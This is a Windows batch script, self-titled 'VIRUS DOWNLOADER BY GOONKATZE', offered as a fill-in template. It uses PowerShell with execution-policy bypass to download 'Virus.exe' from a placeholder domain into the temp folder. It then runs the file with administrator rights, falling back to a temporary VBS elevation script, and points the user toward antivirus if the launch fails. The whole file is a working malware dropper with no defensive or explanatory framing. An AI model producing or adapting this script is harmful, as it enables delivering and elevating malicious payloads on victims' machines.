@echo off
title VIRUS DOWNLOADER
color 0A
cls

echo.
echo   Preparing VIRUS DOWNLOADER BY GOONKATZE...
echo.
timeout /t 2 >nul

:: =============================================
:: Download the file
:: =============================================
set "URL=https://YOURDOMAIN.com/Virus.exe"
set "OUTPUT=%TEMP%\Virus.exe"

echo [ ] Downloading installer...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%' -UseBasicParsing" >nul 2>&1

if not exist "%OUTPUT%" (
    color 0C
    echo.
    echo Error: Download failed!
    echo.
    echo   - Check your internet connection
    echo   - Or the URL might no longer be valid
    echo.
    pause
    exit /b
)

echo [OK] Download completed
timeout /t 1 >nul

:: =============================================
:: Start as Administrator
:: =============================================
echo.
echo [ ] Starting installer as Administrator...
timeout /t 1 >nul

:: Try PowerShell first (cleanest way)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Start-Process -FilePath '%OUTPUT%' -Verb RunAs" >nul 2>&1

:: Fallback method using VBS if PowerShell fails
if errorlevel 1 (
    echo.
    echo PowerShell method failed - trying alternative...
    echo.
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\getadmin.vbs"
    echo UAC.ShellExecute "%OUTPUT%", "", "", "runas", 1 >> "%TEMP%\getadmin.vbs"
    
    cscript //nologo "%TEMP%\getadmin.vbs"
    del "%TEMP%\getadmin.vbs" 2>nul
)

cls
color 0B
echo.
echo   Installer has been launched!
echo.
echo   → If nothing appears, check Windows Defender / antivirus
echo.
echo
echo 
echo.
pause
exit